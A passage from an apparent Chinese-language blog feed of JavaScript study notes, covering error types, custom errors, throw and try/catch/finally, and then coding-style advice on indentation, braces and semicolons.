<h5 id="2-2-4-TypeError对象"><a href="#2-2-4-TypeError对象" class="headerlink" title="2.2.4 TypeError对象"></a>2.2.4 TypeError对象</h5><p><code>TypeError</code>对象是变量或参数不是预期类型时发生的错误。比如，对字符串、布尔值、数值等原始类型的值使用<code>new</code>命令，就会抛出这种错误，因为<code>new</code>命令的参数应该是一个构造函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="number">123</span></span><br><span class="line"><span class="comment">// Uncaught TypeError: 123 is not a constructor</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">obj.unknownMethod()</span><br><span class="line"><span class="comment">// Uncaught TypeError: obj.unknownMethod is not a function</span></span><br></pre></td></tr></table></figure>
<p>上面代码的第二种情况，调用对象不存在的方法，也会抛出<code>TypeError</code>错误，因为<code>obj.unknownMethod</code>的值是<code>undefined</code>，而不是一个函数</p>
<h5 id="2-2-5-URIError对象"><a href="#2-2-5-URIError对象" class="headerlink" title="2.2.5 URIError对象"></a>2.2.5 URIError对象</h5><p><code>URIError</code>对象是<code>URI</code>相关函数的参数不正确时抛出的错误，主要涉及<code>encodeURI()</code>、<code>decodeURI()</code>、<code>encodeURIComponent()</code>、<code>decodeURIComponent()</code>、<code>escape()</code>和<code>unescape()</code>这六个函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">decodeURI</span>(<span class="string">&#x27;%2&#x27;</span>)</span><br><span class="line"><span class="comment">// URIError: URI malformed</span></span><br></pre></td></tr></table></figure>
<h5 id="2-2-6-EvalError对象"><a href="#2-2-6-EvalError对象" class="headerlink" title="2.2.6 EvalError对象"></a>2.2.6 EvalError对象</h5><p><code>eval</code>函数没有被正确执行时，会抛出<code>EvalError</code>错误。该错误类型已经不再使用了，只是为了保证与以前代码兼容，才继续保留</p>
<h5 id="2-2-7-总结"><a href="#2-2-7-总结" class="headerlink" title="2.2.7 总结"></a>2.2.7 总结</h5><p>以上这6种派生错误，连同原始的<code>Error</code>对象，都是构造函数。开发者可以使用它们，手动生成错误对象的实例。这些构造函数都接受一个参数，代表错误提示信息（message）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> err1 = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;出错了！&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> err2 = <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">&#x27;出错了，变量超出有效范围！&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> err3 = <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">&#x27;出错了，变量类型无效！&#x27;</span>);</span><br><span class="line"></span><br><span class="line">err1.message <span class="comment">// &quot;出错了！&quot;</span></span><br><span class="line">err2.message <span class="comment">// &quot;出错了，变量超出有效范围！&quot;</span></span><br><span class="line">err3.message <span class="comment">// &quot;出错了，变量类型无效！&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="2-3-自定义错误"><a href="#2-3-自定义错误" class="headerlink" title="2.3 自定义错误"></a>2.3 自定义错误</h4><p>除了JavaScript原生提供的七种错误对象，还可以定义自己的错误对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">UserError</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.message = message || <span class="string">&#x27;默认信息&#x27;</span>;</span><br><span class="line">  <span class="built_in">this</span>.name = <span class="string">&#x27;UserError&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">UserError.prototype = <span class="keyword">new</span> <span class="built_in">Error</span>();</span><br><span class="line">UserError.prototype.constructor = UserError;</span><br></pre></td></tr></table></figure>
<p>上面代码自定义一个错误对象<code>UserError</code>，让它继承<code>Error</code>对象。然后，就可以生成这种自定义类型的错误了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> UserError(<span class="string">&#x27;这是自定义的错误！&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="2-4-throw语句"><a href="#2-4-throw语句" class="headerlink" title="2.4 throw语句"></a>2.4 throw语句</h4><p><code>throw</code>语句的作用是手动中断程序执行，抛出一个错误</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (x &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;x 必须为正数&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Uncaught ReferenceError: x is not defined</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，如果变量<code>x</code>小于等于<code>0</code>，就手动抛出一个错误，告诉用户<code>x</code>的值不正确，整个程序就会在这里中断执行。可以看到，<code>throw</code>抛出的错误就是它的参数，这里是一个<code>Error</code>实例<br><code>throw</code>也可以抛出自定义错误</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">UserError</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.message = message || <span class="string">&#x27;默认信息&#x27;</span>;</span><br><span class="line">  <span class="built_in">this</span>.name = <span class="string">&#x27;UserError&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> UserError(<span class="string">&#x27;出错了！&#x27;</span>);</span><br><span class="line"><span class="comment">// Uncaught UserError &#123;message: &quot;出错了！&quot;, name: &quot;UserError&quot;&#125;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>throw</code>抛出的是一个<code>UserError</code>实例<br>实际上，<code>throw</code>可以抛出任何类型的值。也就是说，它的参数可以是任何值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 抛出一个字符串</span></span><br><span class="line"><span class="keyword">throw</span> <span class="string">&#x27;Error！&#x27;</span>;</span><br><span class="line"><span class="comment">// Uncaught Error！</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 抛出一个数值</span></span><br><span class="line"><span class="keyword">throw</span> <span class="number">42</span>;</span><br><span class="line"><span class="comment">// Uncaught 42</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 抛出一个布尔值</span></span><br><span class="line"><span class="keyword">throw</span> <span class="literal">true</span>;</span><br><span class="line"><span class="comment">// Uncaught true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 抛出一个对象</span></span><br><span class="line"><span class="keyword">throw</span> &#123;</span><br><span class="line">  toString: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Error!&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// Uncaught &#123;toString: ƒ&#125;</span></span><br></pre></td></tr></table></figure>
<p>对于 JavaScript 引擎来说，遇到<code>throw</code>语句，程序就中止了。引擎会接收到<code>throw</code>抛出的信息，可能是一个错误实例，也可能是其他类型的值</p>
<h4 id="2-5-try…catch结构"><a href="#2-5-try…catch结构" class="headerlink" title="2.5 try…catch结构"></a>2.5 try…catch结构</h4><p>一旦发生错误，程序就中止执行了。JavaScript 提供了<code>try...catch</code>结构，允许对错误进行处理，选择是否往下执行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;出错了!&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.name + <span class="string">&quot;: &quot;</span> + e.message);</span><br><span class="line">  <span class="built_in">console</span>.log(e.stack);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Error: 出错了!</span></span><br><span class="line"><span class="comment">//   at &lt;anonymous&gt;:3:9</span></span><br><span class="line"><span class="comment">//   ...</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>try</code>代码块抛出错误（上例用的是<code>throw</code>语句），JavaScript 引擎就立即把代码的执行，转到<code>catch</code>代码块，或者说错误被<code>catch</code>代码块捕获了。<code>catch</code>接受一个参数，表示<code>try</code>代码块抛出的值<br>如果你不确定某些代码是否会报错，就可以把它们放在<code>try...catch</code>代码块之中，便于进一步对错误进行处理</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  f();</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="comment">// 处理错误</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，如果函数<code>f</code>执行报错，就会进行<code>catch</code>代码块，接着对错误进行处理<br><code>catch</code>代码块捕获错误之后，程序不会中断，会按照正常流程继续执行下去</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="string">&quot;出错了&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">111</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">222</span>);</span><br><span class="line"><span class="comment">// 111</span></span><br><span class="line"><span class="comment">// 222</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>try</code>代码块抛出的错误，被<code>catch</code>代码块捕获后，程序会继续向下执行<br><code>catch</code>代码块之中，还可以再抛出错误，甚至使用嵌套的<code>try...catch</code>结构</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> n;</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="keyword">if</span> (e &lt;= <span class="number">50</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> e;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Uncaught 100</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>catch</code>代码之中又抛出了一个错误<br>为了捕捉不同类型的错误，<code>catch</code>代码块之中可以加入判断语句</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  foo.bar();</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="built_in">EvalError</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e.name + <span class="string">&quot;: &quot;</span> + e.message);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="built_in">RangeError</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e.name + <span class="string">&quot;: &quot;</span> + e.message);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>catch</code>捕获错误之后，会判断错误类型（<code>EvalError</code>还是<code>RangeError</code>），进行不同的处理</p>
<h4 id="2-6-finally代码块"><a href="#2-6-finally代码块" class="headerlink" title="2.6 finally代码块"></a>2.6 finally代码块</h4><p><code>try...catch</code>结构允许在最后添加一个<code>finally</code>代码块，表示不管是否出现错误，都必需在最后运行的语句</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cleansUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;出错了……&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;此行不会执行&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;完成清理工作&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cleansUp()</span><br><span class="line"><span class="comment">// 完成清理工作</span></span><br><span class="line"><span class="comment">// Uncaught Error: 出错了……</span></span><br><span class="line"><span class="comment">//    at cleansUp (&lt;anonymous&gt;:3:11)</span></span><br><span class="line"><span class="comment">//    at &lt;anonymous&gt;:10:1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，由于没有<code>catch</code>语句块，一旦发生错误，代码就会中断执行。中断执行之前，会先执行<code>finally</code>代码块，然后再向用户提示报错信息</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">idle</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;result&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;FINALLY&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">idle(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"><span class="comment">// hello</span></span><br><span class="line"><span class="comment">// FINALLY</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>try</code>代码块没有发生错误，而且里面还包括<code>return</code>语句，但是<code>finally</code>代码块依然会执行。而且，这个函数的返回值还是<code>result</code><br>下面的例子说明，<code>return</code>语句的执行是排在<code>finally</code>代码之前，只是等<code>finally</code>代码执行完毕后才返回</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">countUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    count++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">countUp()</span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line">count</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码说明，<code>return</code>语句里面的<code>count</code>的值，是在<code>finally</code>代码块运行之前就获取了<br>下面是<code>finally</code>代码块用法的典型场景</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">openFile();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  writeFile(Data);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  handleError(e);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">  closeFile();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码首先打开一个文件，然后在<code>try</code>代码块中写入文件，如果没有发生错误，则运行<code>finally</code>代码块关闭文件；一旦发生错误，则先使用<code>catch</code>代码块处理错误，再使用<code>finally</code>代码块关闭文件<br>下面的例子充分反映了<code>try...catch...finally</code>这三者之间的执行顺序</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">&#x27;bug&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 这句原本会延迟到 finally 代码块结束再执行</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">2</span>); <span class="comment">// 不会运行</span></span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 这句会覆盖掉前面那句 return</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">4</span>); <span class="comment">// 不会运行</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">5</span>); <span class="comment">// 不会运行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = f();</span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">result</span><br><span class="line"><span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>catch</code>代码块结束执行之前，会先执行<code>finally</code>代码块<br><code>catch</code>代码块之中，触发转入<code>finally</code>代码块的标志，不仅有<code>return</code>语句，还有<code>throw</code>语句</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">&#x27;出错了！&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;捕捉到内部错误&#x27;</span>);</span><br><span class="line">    <span class="keyword">throw</span> e; <span class="comment">// 这句原本会等到finally结束再执行</span></span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 直接返回</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  f();</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="comment">// 此处不会执行</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;caught outer &quot;bogus&quot;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  捕捉到内部错误</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，进入<code>catch</code>代码块之后，一遇到<code>throw</code>语句，就会去执行<code>finally</code>代码块，其中有<code>return false</code>语句，因此就直接返回了，不再会回去执行<code>catch</code>代码块剩下的部分了。</p>
<p><code>try</code>代码块内部，还可以再使用<code>try</code>代码块</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    consle.log(<span class="string">&#x27;Hello world!&#x27;</span>); <span class="comment">// 报错</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Finally&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Will I run?&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(error) &#123;</span><br><span class="line">  <span class="built_in">console</span>.error(error.message);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Finally</span></span><br><span class="line"><span class="comment">// consle is not defined</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>try</code>里面还有一个<code>try</code>。内层的<code>try</code>报错（<code>console</code>拼错了），这时会执行内层的<code>finally</code>代码块，然后抛出错误，被外层的<code>catch</code>捕获</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS语法-错误处理机制</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0013</title>
    <url>/2021/05/11/%E6%89%93%E5%8D%A10013/</url>
    <content><![CDATA[<p><font color=pink>我们总是在无止境的追求幸福，幻想彩色的气球，夏夜的喷泉，冬天的初雪，以为足够夸张，足够梦幻才算的上是浪漫，所以我们不满足平凡的生活，拼了命的去追求那些存在于童话世界的美好。但其实，我们的生活才是唯一有色彩的真实世界。在那些被忽略的日子里，也有很多浪漫的细节。</font></p>
<h2 id="JS语法"><a href="#JS语法" class="headerlink" title="JS语法"></a>JS语法</h2><h3 id="3-JS语法-编程风格"><a href="#3-JS语法-编程风格" class="headerlink" title="3. JS语法-编程风格"></a>3. JS语法-编程风格</h3><h4 id="3-1-概括"><a href="#3-1-概括" class="headerlink" title="3.1 概括"></a>3.1 概括</h4><p>“编程风格”（programming style）指的是编写代码的样式规则。不同的程序员，往往有不同的编程风格。</p>
<p>有人说，编译器的规范叫做“语法规则”（grammar），这是程序员必须遵守的；而编译器忽略的部分，就叫“编程风格”（programming style），这是程序员可以自由选择的。这种说法不完全正确，程序员固然可以自由选择编程风格，但是好的编程风格有助于写出质量更高、错误更少、更易于维护的程序。</p>
<p>所以，编程风格的选择不应该基于个人爱好、熟悉程度、打字量等因素，而要考虑如何尽量使代码清晰易读、减少出错。你选择的，不是你喜欢的风格，而是一种能够清晰表达你的意图的风格。这一点，对于 JavaScript 这种语法自由度很高的语言尤其重要。</p>
<p>必须牢记的一点是，如果你选定了一种“编程风格”，就应该坚持遵守，切忌多种风格混用。如果你加入他人的项目，就应该遵守现有的风格。</p>
<span id="more"></span>
<h4 id="3-2-缩进"><a href="#3-2-缩进" class="headerlink" title="3.2 缩进"></a>3.2 缩进</h4><p>行首的空格和 Tab 键，都可以产生代码缩进效果（indent）。</p>
<p>Tab 键可以节省击键次数，但不同的文本编辑器对 Tab 的显示不尽相同，有的显示四个空格，有的显示两个空格，所以有人觉得，空格键可以使得显示效果更统一。</p>
<p>无论你选择哪一种方法，都是可以接受的，要做的就是始终坚持这一种选择。不要一会使用 Tab 键，一会使用空格键。</p>
<h4 id="3-3-区块"><a href="#3-3-区块" class="headerlink" title="3.3 区块"></a>3.3 区块</h4><p>如果循环和判断的代码体只有一行，JavaScript 允许该区块（block）省略大括号</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (a)</span><br><span class="line">  b();</span><br><span class="line">  c();</span><br></pre></td></tr></table></figure>
<p>上面代码的原意可能是下面这样：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (a) &#123;</span><br><span class="line">  b();</span><br><span class="line">  c();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是，实际效果却是下面这样：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (a) &#123;</span><br><span class="line">  b();</span><br><span class="line">&#125;</span><br><span class="line">  c();</span><br></pre></td></tr></table></figure>
<p>因此，建议总是使用大括号表示区块。</p>
<p>另外，区块起首的大括号的位置，有许多不同的写法。最流行的有两种，一种是起首的大括号另起一行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">block</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另一种是起首的大括号跟在关键字的后面。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">block &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一般来说，这两种写法都可以接受。但是，JavaScript 要使用后一种，因为 JavaScript 会自动添加句末的分号，导致一些难以察觉的错误</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span></span><br><span class="line">&#123;</span><br><span class="line">  key: value</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 相当于</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#123;</span><br><span class="line">  key: value</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面的代码的原意，是要返回一个对象，但实际上返回的是<code>undefined</code>，因为 JavaScript 自动在<code>return</code>语句后面添加了分号。为了避免这一类错误，需要写成下面这样</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">  key : value</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>因此，表示区块起首的大括号，不要另起一行</p>
<h4 id="3-4-圆括号"><a href="#3-4-圆括号" class="headerlink" title="3.4 圆括号"></a>3.4 圆括号</h4><p>圆括号（parentheses）在 JavaScript 中有两种作用，一种表示函数的调用，另一种表示表达式的组合（grouping）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 圆括号表示函数的调用</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 圆括号表示表达式的组合</span></span><br><span class="line">(<span class="number">1</span> + <span class="number">2</span>) * <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>建议可以用空格，区分这两种不同的括号:<br>`</p>
<ol>
<li><p>表示函数调用时，函数名与左括号之间没有空格。</p>
</li>
<li><p>表示函数定义时，函数名与左括号之间没有空格。</p>
</li>
<li><p>其他情况时，前面位置的语法元素与左括号之间，都有一个空格。<br>`<br>按照上面的规则，下面的写法都是不规范的:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">foo (bar)</span><br><span class="line"><span class="keyword">return</span>(a+b);</span><br><span class="line"><span class="keyword">if</span>(a === <span class="number">0</span>) &#123;...&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params">b</span>) </span>&#123;...&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;...&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码的最后一行是一个匿名函数，<code>function</code>是语法关键字，不是函数名，所以与左括号之间应该要有一个空格</p>
</li>
</ol>
<h4 id="3-5-行尾的分号"><a href="#3-5-行尾的分号" class="headerlink" title="3.5 行尾的分号"></a>3.5 行尾的分号</h4><p>分号表示一条语句的结束。JavaScript 允许省略行尾的分号。事实上，确实有一些开发者行尾从来不写分号。但是，由于下面要讨论的原因，建议还是不要省略这个分号。</p>
<h5 id="3-5-1-不使用分号的情况"><a href="#3-5-1-不使用分号的情况" class="headerlink" title="3.5.1 不使用分号的情况"></a>3.5.1 不使用分号的情况</h5><p>首先，以下三种情况，语法规定本来就不需要在结尾添加分号</p>
<h6 id="1-for和while循环"><a href="#1-for和while循环" class="headerlink" title="(1)for和while循环"></a>(1)for和while循环</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( ; ; ) &#123;</span><br><span class="line">&#125; <span class="comment">// 没有分号</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">&#125; <span class="comment">// 没有分号</span></span><br></pre></td></tr></table></figure>
<p>注意，<code>do...while</code>循环是有分号的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  a--;</span><br><span class="line">&#125; <span class="keyword">while</span>(a &gt; <span class="number">0</span>); <span class="comment">// 分号不能省略</span></span><br></pre></td></tr></table></figure>
<h6 id="2-分支语句-if-switch-try"><a href="#2-分支语句-if-switch-try" class="headerlink" title="(2)分支语句:if,switch,try"></a>(2)分支语句:if,switch,try</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">&#125; <span class="comment">// 没有分号</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> () &#123;</span><br><span class="line">&#125; <span class="comment">// 没有分号</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">&#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">&#125; <span class="comment">// 没有分号</span></span><br></pre></td></tr></table></figure>
<h6 id="3-函数的声明语句"><a href="#3-函数的声明语句" class="headerlink" title="(3)函数的声明语句"></a>(3)函数的声明语句</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">&#125; <span class="comment">// 没有分号</span></span><br></pre></td></tr></table></figure>
<p>注意，函数表达式仍然要使用分号。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>以上三种情况，如果使用了分号，并不会出错。因为，解释引擎会把这个分号解释为空语句。</p>
<h5 id="3-5-2-分号的自动添加"><a href="#3-5-2-分号的自动添加" class="headerlink" title="3.5.2 分号的自动添加"></a>3.5.2 分号的自动添加</h5><p>除了上一节的三种情况，所有语句都应该使用分号。但是，如果没有使用分号，大多数情况下，JavaScript 会自动添加。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
